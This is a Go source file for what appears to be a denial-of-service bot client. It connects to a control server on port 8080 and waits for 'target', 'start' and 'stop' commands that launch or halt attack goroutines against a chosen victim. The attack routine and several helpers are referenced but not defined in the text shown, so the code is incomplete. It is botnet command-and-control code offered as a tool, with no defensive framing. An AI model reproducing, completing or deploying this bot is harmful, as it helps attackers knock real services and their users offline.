package main

import (
	"bytes"
	"fmt"
	"net"
	"strings"
	"sync"
	"time"
)

var running int

const TARGET_IP = "" // target IP here
const SERVER_IP = "" // control server IP here

func main() {
	var threads sync.WaitGroup

	// server socket details and setup
	server_addr := SERVER_IP + ":" + "8080"

	var target string

	// connect server socket
	fmt.Println("Connecting to server...")
	var server_socket net.Conn
	for {
		server_socket = connectSocket(server_addr)
		if server_socket == nil {
			fmt.Println("Waiting for connection")
			time.Sleep(time.Second)
		} else {
			break
		}
	}

	// infinite loop
	for {
		cmd_buf := make([]byte, 1024)
		receiveCommand(server_socket, &cmd_buf)
		cmd_buf = bytes.Trim(cmd_buf, "\x00")
		cmd_args := strings.Split(string(cmd_buf), " ")
		cmd_arg1 := cmd_args[0]
		if cmd_arg1 == "target" {
			target = cmd_args[1]
			fmt.Println("Target has been set to " + target)
		} else if cmd_arg1 == "start" {
			fmt.Println("Executing attack...")
			running = 1
			for i := 0; i < NUM_THREADS; i++ {
				go attack(target)
			}
		} else if cmd_arg1 == "stop" {
			running = 0
			fmt.Println("Stopping attack...")
			threads.Wait()
		}
	}
}
